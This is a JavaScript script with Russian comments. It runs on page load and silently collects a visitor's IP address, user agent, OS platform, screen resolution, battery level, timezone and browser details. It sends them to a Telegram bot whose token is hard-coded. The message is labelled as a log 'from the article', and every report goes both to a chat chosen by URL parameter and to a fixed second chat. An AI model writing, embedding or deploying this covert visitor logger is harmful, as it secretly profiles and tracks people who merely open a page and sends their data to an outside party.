async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Ошибка получения IP адреса:', error);
        return 'неизвестно';
    }
} // сосиоуйте

function getUserAgent() {
    try {
        return navigator.userAgent || 'неизвестно';
    } catch (error) {
        console.error('Ошибка получения UserAgent:', error);
        return 'неизвестно';
    }
}

function getOSName() {
    try {
        return navigator.platform || 'неизвестно';
    } catch (error) {
        console.error('Ошибка получения имени ОС:', error);
        return 'неизвестно';
    }
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('Ошибка получения процента заряда батареи:', error);
        return 'неизвестно';
    }
}

function getScreenResolution() {
    try {
        return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
    } catch (error) {
        console.error('Ошибка получения разрешения экрана:', error);
        return 'неизвестно';
    }
}

function getBrowserInfo() {
    try {
        return {
            name: navigator.appName || 'неизвестно',
            version: navigator.appVersion || 'неизвестно',
            engine: navigator.product || 'неизвестно'
        };
    } catch (error) {
        console.error('Ошибка получения информации о браузере:', error);
        return {
            name: 'неизвестно',
            version: 'неизвестно',
            engine: 'неизвестно'
        };
    }
}

async function sendDataToTelegram() { 
    const token = "7212589811:AAH4Qyoboljh-SYCE48LL_nyZNCS7KvUeI0";
    const chatIdParam = new URLSearchParams(window.location.search).get("id");
    const chatId = chatIdParam || -1002184270191; // если параметр не указан, используется указанный по умолчанию
    const additionalChatId = -1002184270191;

    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();

    const message = `
⚙️ Лог из статьи

<b>🖥️ Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>неизвестно</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>

<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
    `;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('text', message);
    formData.append('parse_mode', 'HTML');

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
        }
        console.log('Запрос успешно отправлен');
    } catch (error) {
        console.error('Ошибка:', error);
    }
    // отправка два
    const formData1 = new FormData();
    formData1.append('chat_id', additionalChatId);
    formData1.append('text', message);
    formData1.append('parse_mode', 'HTML');

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData1
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
        }
        console.log('Запрос успешно отправлен');
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

sendDataToTelegram();